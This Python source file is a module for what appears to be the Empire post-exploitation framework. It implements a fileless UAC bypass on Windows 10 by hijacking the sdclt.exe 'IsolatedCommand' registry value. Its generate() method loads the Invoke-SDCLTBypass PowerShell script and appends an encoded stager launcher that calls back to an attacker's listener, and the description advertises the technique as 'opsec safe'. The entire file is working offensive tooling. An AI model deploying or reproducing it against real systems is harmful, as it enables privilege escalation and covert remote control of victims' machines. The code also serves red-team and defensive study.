from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-SDCLTBypass',

            # List of one or more authors for the module
            'Author': ['@enigma0x3','@H3LL0WORLD'],

            # More verbose multi-line description of the module
            'Description': ('Bypasses UAC by hijacking the "IsolatedCommand" value in "shell\runas\command"'
			    'Only tested on Windows 10'
                            'No files are dropped to disk, making this opsec safe.'),

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/',
                'https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description':   'Agent to grab a screenshot from.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # Save off a copy of the mainMenu object to access external
        self.mainMenu = mainMenu

        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):

	listenerName = self.options['Listener']['Value']

	# staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-SDCLTBypass.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()
        
        script = moduleCode

	if not self.mainMenu.listeners.is_listener_valid(listenerName):
	    # not a valid listener, return nothing for the script
	    print helpers.color("[!] Invalid listener: " + listenerName)
	    return ""
	else:
	    # generate the PowerShell one-liner with all of the proper options set
	    launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
	    encScript = launcher.split(" ")[-1]
	    if launcher == "":
		print helpers.color("[!] Error in launcher generation.")
		return ""
	    else:
		script += "Invoke-SDCLTBypass -Command \"%s\"" % (encScript)
		return script 
